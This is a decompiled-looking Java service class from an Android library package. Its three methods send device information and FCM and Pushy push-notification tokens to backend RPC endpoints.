package com.hawkshaw.library.datalayer.network.service;

import X1.B;
import a3.e;
import com.hawkshaw.library.datalayer.models.PushDeviceInfoRequest;
import com.hawkshaw.library.datalayer.models.PushFCMTokenRequest;
import com.hawkshaw.library.datalayer.models.PushPushyTokenRequest;
import t3.N;

public final class AppServiceImpl implements AppService {
    public Object pushDeviceInfo(PushDeviceInfoRequest pushDeviceInfoRequest, e eVar) {
        return B.B(N.f9292c, new AppServiceImpl$pushDeviceInfo$$inlined$apiCall$default$1("app.App/PushDeviceInfo", pushDeviceInfoRequest, false, (e) null), eVar);
    }

    public Object pushFCMToken(PushFCMTokenRequest pushFCMTokenRequest, e eVar) {
        return B.B(N.f9292c, new AppServiceImpl$pushFCMToken$$inlined$apiCall$default$1("app.App/SaveFCMToken", pushFCMTokenRequest, false, (e) null), eVar);
    }

    public Object pushPushyToken(PushPushyTokenRequest pushPushyTokenRequest, e eVar) {
        return B.B(N.f9292c, new AppServiceImpl$pushPushyToken$$inlined$apiCall$1("app.App/SavePushyToken", pushPushyTokenRequest, true, (e) null), eVar);
    }
}
